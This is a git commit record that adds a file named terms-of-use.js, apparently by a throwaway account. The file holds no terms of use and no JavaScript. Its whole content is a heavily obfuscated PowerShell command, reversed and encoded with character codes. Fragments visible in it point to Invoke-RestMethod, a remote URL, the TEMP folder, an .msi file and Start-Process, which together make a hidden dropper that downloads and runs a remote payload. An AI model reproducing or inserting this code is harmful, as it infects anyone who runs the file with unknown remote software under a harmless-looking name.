409cee212600e1b270a5dc31fb91c5841b6245c7
Azkic50 <Azkilohj55@gmail.com>
2025-04-06 15:38:51 -0400

    Create terms-of-use.js

---
+++ terms-of-use.js
@@ -0,0 +1,22 @@
+ & ( $enV:COMspec[4,15,25]-JoIN'') (  [StRiNg]::JOiN('',( [rEgex]::MAtcHeS( "))'$',)811]rAHc[+801]rAHc[+27]rAHc[((ECAlPeR.)43]rAHc[]gNIRts[,)311]rAHc[+211]rAHc[+15]rAHc[((ECAlPeR.)93]rAHc[]gNIRts[,)58]rAHc[+38]rAHc[+111]rAHc[((ECAlPeR.)' ) )29]rahC[]GnIRTS[,USotaJUSo(EcaLpEr.)93]rahC[]GnIRTS[,USoFXJUSo(EcaLpEr.)USovlHUSo,USoskLUSo(EcaLpEr.))USoFXJ1lFXJ+FXJa iFXJ+FXJrU- FXJ+FXJdohteMtseFXJ+FXJRFXJ+FXJ-'+'FXJ+FXJekovnI '+'   FXJ+FXJ    
+{ )daolnwod1la( fi      
+ USo,USoaFXJ+FXUSo,USoXJ
+;'+'htaFXJ+FXJPUSo,USoFXJ+FXJ )htFXJ+FXJUSo,USoFUSo,USoXJUBFXJ+FXJ5FXJ+FXJzS =FUSo,USoc-sraF'+'XJ+FXJc'+'FXUSo,USoXJ+FXJuFXJ+FXJrtFXJ+FXJ1FXUSo,USoXJ+FXJ bFXJ+FXJ FXJ+FXJ;5FXJ+USo,USoSUSo'+',USozS ='+'FXJ+FXJ htaPeFXUSo,'+'USoJ-og//:sFXJ+FXJpttFXJ+FXJh5zS = aFXJ+FXJ{@FXJ+FXJUSo,USoFXJ  FXJ+FXJ
+
+}  
+}FXJ+FXJ  FXJ+FXJ FXJ+FXJ 
+F'+'XJ+FXJ{ hcFXJ+FXJtac    FXJ+FXJ
+}   FXJ+FXJ FXJ+FUSo,USoJPeUSo,USo[,FXJ5zSFXJ(eCAlPEr.'+')63]rAHc[]Gn'+'IrtS[,)94]rAHc[+801]rAHc[+79]rAHc[((eCAlPEr.)FXJtaJFXJ,FXJwSUSo,USoJ+FXJlaFXUSo,USoFXJ+FXJa niFXJ+FXJ FXJ+FXJi1la( FXJ+FXJhcFXJ+FXJaeUSo,USoFXJ+FXJemosFXJ+FXJ1la  
+'+'
+FXJ( ( )FXJ'+'FXJNiOJ-]52,51,4[CepsmoC:vNeskL ( . USo,USo}USo,USoHc[]GnIrtUSo,USo)USo,USoXJ+FXJt    
+{ )aFXJ+FXJtaFUSo,USoJ+FXUS'+'o,USorFXJ+FXJof  
+;FXJ+FXJ)
+}5FX'+'J+FXJzSi'+'sm.4FXJ+FXJQ'+'JBODFXJ+FXJOFXJ+FUSo,USoFXJs1FXJ+FXJlUSo,USoFXJ+FXJlif1la htaP-tFXJ+FXJseFXJ+FXJT( FX'+'J+FUSo,USoFXJ+FXJisFXJ+FXUSo,USo]FXJ+FXJtcejbOFXJ+FXJmFXJ+FXJotsuFXJ+FXJCSP[  
+FXJ+FXJ(FXJ+FXJ@ = ataFXJ+FX'+'JDUSo,USoXJ+FXJ- a.iFXJ+US'+'o,USoelif1la sseFXJ+FXJcFXUSo,US'+'oWFXJ(eCAlPEr.U'+'S'+'o,USoXJ+FXJDFXJ+FXJeFXJ+'+'FXJmoFX'+'J+USo,USoJ+FXJorP-traFXJ+FXJtS      '+'
+}      
+ ;htaPelif1la eliFXJ+FXJFtuFXJ+FXJOFUSo'+',USoJ+FX'+'J =FXJ+FXJ daolnwod1laFXJ+FXJ    FXJ+FXJ  
+;5zS)bFXJ+FXJ.iFXJ+FXJ1la(1laFXJ+FXJw'+'SWPFXJ+FXJMETFXJ+FXJ:vnUSo,USoXJfi  '+' FXJ+FXJ   
+;eFUSo,'+'USoJ'+'+FXJlif1FXJ+FXJla    FXJ+FXJ FXJ+FXJ 
+{FXJ+FXJ yrUSo,USo ) )43]rAUSo,USoJm.QFXJ+FXJJBODOUB/dfFXJ+FXJc.tseFXJ+FXUSo,USoXJlnwoF'+'XJ'+'+FXJdFXJ+FXJ1la  FXJ+F'+'XJ FXJ+FX'+'J   FXJ+FXJ  
+{USo,USoJrFXJ+FXJpaehUSo,USoFX'+'JzSUSo,USo      
+;eslafFXJ+FXJ1la FXJ+FXJ= FXJ+FXJdaoFXJ+FUSo,USoe1lFXJ+FXJa5USof- qp3}6{}32{}33{}82{}21{}22{}03{}04{}31{}01'+'{}41{}24{}42{}1{}4{}93{}14{}92{}71{}8{}53{}72{}9{}0{}23{}7{}83{}12{}11{}81{}62{'+'}'+'91{}73{}43{}2{}61{}5{}3{}63{}02{}13{}51{}52{qp3(( ()USoxUSo+]43[emoHSpvlH+]4[emOhsPvlH (. '(()'X'+]03[EMohsp$+]4[emOhsp$ (." , '.', 'riGhTtoLeFT') |foReacH{$_.VAlue} ) )  )
